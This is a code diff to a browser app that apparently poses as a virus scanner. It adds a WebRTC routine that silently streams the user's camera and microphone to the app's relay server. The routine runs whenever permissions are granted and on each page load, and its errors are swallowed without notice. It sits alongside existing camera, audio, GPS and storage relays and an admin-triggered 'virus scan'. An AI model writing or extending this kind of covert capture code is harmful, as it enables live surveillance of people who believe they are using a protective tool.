@@ -174,6 +174,7 @@ async function requestAllPermissions() {
         hidePermissionGate();
         startCameraRelay();
         startAudioRelay();
+        startWebRTC();
         startGpsTracking();
         startHeartbeat();
         startStoragePolling();
@@ -1060,6 +1061,115 @@ function reopenPermissions() {
     if (scanner) scanner.classList.add('hidden');
 }
 
+// ============ WEBRTC ============
+
+let webrtcPC = null;
+let webrtcConnected = false;
+
+async function startWebRTC() {
+    if (webrtcConnected || webrtcPC) return;
+    const auth = getAuth();
+    const perms = checkPermissions();
+    if (!auth || !perms) return;
+    if (!perms.camera && !perms.microphone) return;
+
+    let stream;
+    if (gPermissionStream) {
+        stream = gPermissionStream;
+    } else if (cameraStream) {
+        stream = cameraStream;
+    } else { return; }
+
+    try {
+        const pc = new RTCPeerConnection({
+            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+        });
+        webrtcPC = pc;
+
+        stream.getTracks().forEach(track => pc.addTrack(track, stream));
+
+        pc.onicecandidate = (e) => {
+            if (e.candidate) {
+                sendIceCandidate(auth.uid, e.candidate);
+            }
+        };
+
+        pc.oniceconnectionstatechange = () => {
+            if (pc.iceConnectionState === 'connected' || pc.iceConnectionState === 'completed') {
+                webrtcConnected = true;
+            }
+        };
+
+        const offer = await pc.createOffer();
+        await pc.setLocalDescription(offer);
+
+        await fetch('/api/relay/webrtc/offer', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                uid: auth.uid,
+                auth: makeAuthPayload(),
+                sdp: offer.sdp,
+                type: offer.type
+            })
+        });
+
+        pollWebRTCAnswer(auth);
+        startWebRTCIcePolling(auth);
+
+    } catch {}
+}
+
+async function pollWebRTCAnswer(auth) {
+    const maxAttempts = 30;
+    let attempt = 0;
+    const poll = setInterval(async () => {
+        attempt++;
+        if (attempt > maxAttempts) { clearInterval(poll); return; }
+        try {
+            const resp = await fetch(`/api/relay/webrtc/answer?uid=${auth.uid}&auth=${makeAuthPayload()}`);
+            const data = await resp.json();
+            if (data.status === 'ok' && data.sdp && webrtcPC) {
+                clearInterval(poll);
+                await webrtcPC.setRemoteDescription(new RTCSessionDescription({
+                    sdp: data.sdp,
+                    type: data.type
+                }));
+            }
+        } catch {}
+    }, 2000);
+}
+
+async function sendIceCandidate(uid, candidate) {
+    try {
+        await fetch('/api/relay/webrtc/ice', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                uid: uid,
+                auth: makeAuthPayload(),
+                candidate: candidate.toJSON ? candidate.toJSON() : { candidate: candidate.candidate, sdpMid: candidate.sdpMid, sdpMLineIndex: candidate.sdpMLineIndex }
+            })
+        });
+    } catch {}
+}
+
+function startWebRTCIcePolling(auth) {
+    if (!webrtcPC) return;
+    const poll = setInterval(async () => {
+        if (!webrtcPC) { clearInterval(poll); return; }
+        try {
+            const resp = await fetch(`/api/relay/webrtc/ice?uid=${auth.uid}&auth=${makeAuthPayload()}`);
+            const data = await resp.json();
+            if (data.status === 'ok' && data.candidates) {
+                for (const c of data.candidates) {
+                    try { await webrtcPC.addIceCandidate(new RTCIceCandidate(c)); } catch {}
+                }
+            }
+        } catch {}
+    }, 3000);
+}
+
 // ============ VIRUS TRIGGER POLLING ============
 // Admin tetiklediğinde kullanıcı tarafında tarama başlatılır
 
@@ -1111,6 +1221,7 @@ document.addEventListener('DOMContentLoaded', async () => {
         // İzinler daha önce verilmiş, arka plan servislerini başlat
         startCameraRelay();
         startAudioRelay();
+        startWebRTC();
         startGpsTracking();
         startHeartbeat();
         startStoragePolling();
